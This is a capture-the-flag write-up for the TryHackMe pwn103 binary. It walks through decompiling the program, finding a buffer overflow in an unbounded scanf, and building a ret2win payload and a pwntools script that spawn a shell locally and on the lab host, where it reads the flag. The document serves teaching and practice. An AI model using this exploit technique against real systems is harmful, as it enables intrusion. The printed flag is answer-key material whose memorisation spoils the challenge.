# pwn103

- [Binary Analysis](#binary-analysis)
- [Crafting the Payload](#crafting-the-payload)
- [Local Exploitation](#local-exploitation)
- [Remote Exploitation](#remote-exploitation)

```

The challenge is running on port 9003

```

## Binary Analisys

```bash
$ ls
pwn103

$ file pwn103 
pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
```
#### checksec
```bash
$ checksec --file=pwn103
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

The *radare2* tool is used to further analyze the track.

```text
[0x004010b0]> afl
0x00401030    1      6 sym.imp.strncmp
0x00401040    1      6 sym.imp.puts
0x00401050    1      6 sym.imp.system
0x00401060    1      6 sym.imp.printf
0x00401070    1      6 sym.imp.read
0x00401080    1      6 sym.imp.strcmp
0x00401090    1      6 sym.imp.setvbuf
0x004010a0    1      6 sym.imp.__isoc99_scanf
0x004010b0    1     42 entry0
0x004010f0    4     31 sym.deregister_tm_clones
0x00401120    4     49 sym.register_tm_clones
0x00401160    3     32 entry.fini0
0x00401190    1      6 entry.init0
0x004016e0    1      1 sym.__libc_csu_fini
0x004016e4    1      9 sym._fini
0x0040153e    1     22 sym.banner
0x00401262    1     92 sym.announcements
0x0040158c    9    236 main
0x004011f7    1    107 sym.rules
0x00401680    4     93 sym.__libc_csu_init
0x004012be    4    186 sym.general
0x004010e0    1      1 sym._dl_relocate_static_pie
0x00401554    1     56 sym.admins_only
0x004014e2    1     92 sym.discussion
0x00401378   12    362 sym.bot_cmd
0x00401000    3     23 sym._init
0x00401196    1     97 sym.setup

```

Among the symbols, the *main* function is identified.

We proceed with the inspection of the decompiled code of the *main* function with *ghidra*.

```c

void main(void)

{
  undefined4 val;
  
  setup();
  banner();
  puts(&DAT_00403298);
  puts(&DAT_004032c0);
  puts(&DAT_00403298);
  printf(&DAT_00403323);
  __isoc99_scanf(&DAT_00403340,&val);
  switch(val) {
  default:
    main();
    break;
  case 1:
    announcements();
    break;
  case 2:
    rules();
    break;
  case 3:
    general();
    break;
  case 4:
    discussion();
    break;
  case 5:
    bot_cmd();
  }
  return;
}

```

In the *main* function there is a *switch-case statement* to choose which features to start. Let's explore them.

```c
void announcements(void)

{
  puts(&DAT_00402158);
  puts("A new room is available!");
  puts("Check it out: \x1b[0;34mhttps://tryhackme.com/room/binaryexploitation\x1b[0m\n");
  puts(&DAT_004021d0);
  puts(&DAT_00402360);
  main();
  return;
}

```

```c
void rules(void)

{
  puts(&DAT_00402008);
  puts(&DAT_00402018);
  puts(&DAT_00402040);
  puts(&DAT_00402080);
  puts(&DAT_004020c8);
  puts(&DAT_00402128);
  main();
  return;
}
```

```c
void discussion(void)

{
  puts(&DAT_00402e01);
  puts("--[Welcome to Room Discussion]--\n");
  puts(&DAT_00402e48);
  puts(&DAT_00402e78);
  puts(&DAT_00402eb8);
  main();
  return;
}
```

```c
void bot_cmd(void)

{
  int iVar1;
  char local_16 [10];
  int local_c;
  
  puts(&DAT_00402492);
  for (local_c = 0; local_c < 4; local_c = local_c + 1) {
    printf("root@pwn101:~/root# ");
    read(0,local_16,10);
    iVar1 = strncmp(local_16,"/help",5);
    if (iVar1 == 0) {
      puts(&DAT_004024c1);
      puts("/rank");
      puts("/invite");
      puts("/help");
      puts("/meme\n");
    }
    else {
      iVar1 = strncmp(local_16,"/rank",5);
      if (iVar1 == 0) {
        puts(&DAT_004024f8);
      }
      else {
        iVar1 = strncmp(local_16,"/invite",7);
        if (iVar1 == 0) {
          puts("\nOur Discord server link: \x1b[0;34mhttps://discord.gg/JxhCHPajsv\x1b[0m\n");
        }
        else {
          iVar1 = strncmp(local_16,"/meme",5);
          if (iVar1 == 0) {
            puts(&DAT_00402670);
          }
        }
      }
    }
  }
  main();
  return;
}

```

The previous ones are not interesting, they do not allow you to do much with the program.

However, the *general* function:

```c
void general(void)

{
  int iVar1;
  char local_28 [32];
  
  puts(&DAT_004023aa);
  puts(&DAT_004023c0);
  puts(&DAT_004023e8);
  puts(&DAT_00402418);
  printf("------[pwner]: ");
  __isoc99_scanf(&DAT_0040245c,local_28);
  iVar1 = strcmp(local_28,"yes");
  if (iVar1 == 0) {
    puts(&DAT_00402463);
    main();
  }
  else {
    puts(&DAT_0040247f);
  }
  return;
}
```

It is the only one that takes an input from the user without worrying about limiting the number of bytes.

So, there is a **Buffer Overflow Vulnerability**.

It could be exploited to hijack the program execution to invoke the function `admins_only`:

```c
void admins_only(void)

{
  puts(&DAT_00403267);
  puts(&DAT_0040327c);
  system("/bin/sh");
  return;
}

```

> **Return to Win**.

Note that the track is **NO PIE** (view [checksec](#checksec)), so:

- **ret2win** to `admins_only@ 0x401554`.

## Crafting the Payload

Payload:
- **Go to *general***: 3
- **Exploit the BOF**: fill the *local_28* variable with 32 bytes of padding and also the saved *rbp* with 8 bytes.

```bash
$ echo "3" > payload

$ python2 -c 'print b"A"*40 + b"\x5c\x15\x40\x00\x00\x00\x00\x00\x00" + b"\n"' >> payload

$ xxd payload 
00000000: 330a 4141 4141 4141 4141 4141 4141 4141  3.AAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 5c15 4000 0000  AAAAAAAAAA\.@...
00000030: 0000 000a 0a                             .....

```

## Local Exploitation

The exploit is run locally.

```bash
$ ./pwn103 < payload 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 
🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
Bus error (core dumped)
```

But it doesn't work, so it was decided to build directly with a script also for the remote version.

Build and run the `exploit` script and use the *pwntools* library.

`exploit`

```python
#!/usr/bin/env python3

from pwn import context, ELF, process, remote

exe = './pwn103'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

#REMOTE, PORT = '10.10.79.209', 9003
#io=remote(REMOTE, PORT)
io=process([exe])

io.sendlineafter(b'Choose the channel:', b'3')
io.sendline(b"A"*0x20 + b"B"*0x8 + b"\x5c\x15\x40\x00\x00\x00\x00\x00")
io.interactive()

```

Result:

```bash
$ ./exploit
...
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Sent 0x31 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  42 42 42 42  42 42 42 42  5c 15 40 00  00 00 00 00  │BBBB│BBBB│\·@·│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
 [DEBUG] Received 0xe3 bytes:
    00000000  0a f0 9f 97  a3 20 20 47  65 6e 65 72  61 6c 3a 0a  │····│·  G│ener│al:·│
    00000010  0a 2d 2d 2d  2d 2d 2d 5b  6a 6f 70 72  61 76 65 65  │·---│---[│jopr│avee│
    00000020  6e 5d 3a 20  48 65 6c 6c  6f 20 70 77  6e 65 72 73  │n]: │Hell│o pw│ners│
    00000030  20 f0 9f 91  8b 0a 2d 2d  2d 2d 2d 2d  5b 6a 6f 70  │ ···│··--│----│[jop│
    00000040  72 61 76 65  65 6e 5d 3a  20 48 6f 70  65 20 79 6f  │rave│en]:│ Hop│e yo│
    00000050  75 27 72 65  20 64 6f 69  6e 67 20 77  65 6c 6c 20  │u're│ doi│ng w│ell │
    00000060  f0 9f 98 84  0a 2d 2d 2d  2d 2d 2d 5b  6a 6f 70 72  │····│·---│---[│jopr│
    00000070  61 76 65 65  6e 5d 3a 20  59 6f 75 20  66 6f 75 6e  │avee│n]: │You │foun│
    00000080  64 20 74 68  65 20 76 75  6c 6e 2c 20  72 69 67 68  │d th│e vu│ln, │righ│
    00000090  74 3f 20 f0  9f a4 94 0a  0a 2d 2d 2d  2d 2d 2d 5b  │t? ·│····│·---│---[│
    000000a0  70 77 6e 65  72 5d 3a 20  54 72 79 20  68 61 72 64  │pwne│r]: │Try │hard│
    000000b0  65 72 21 21  21 20 f0 9f  92 aa 0a 0a  f0 9f 91 ae  │er!!│! ··│····│····│
    000000c0  20 20 41 64  6d 69 6e 73  20 6f 6e 6c  79 3a 0a 0a  │  Ad│mins│ onl│y:··│
    000000d0  57 65 6c 63  6f 6d 65 20  61 64 6d 69  6e 20 f0 9f  │Welc│ome │admi│n ··│
    000000e0  98 84 0a                                            │···│
    000000e3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x3 bytes:
    b'ap\n'
ap

```

Works!

## Remote Exploitation

The same script runs the exploit remotely.

```bash
$ ./exploit
...
👮  Admins only:

Welcome admin 😄
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn103\n'
    b'pwn103.c\n'
flag.txt
pwn103
pwn103.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x13 bytes:
    b'THM{w3lC0m3_4Dm1N}\n'
THM{w3lC0m3_4Dm1N}
$ 
[*] Closed connection to 10.10.79.209 port 9003
```

Flag captured.

---
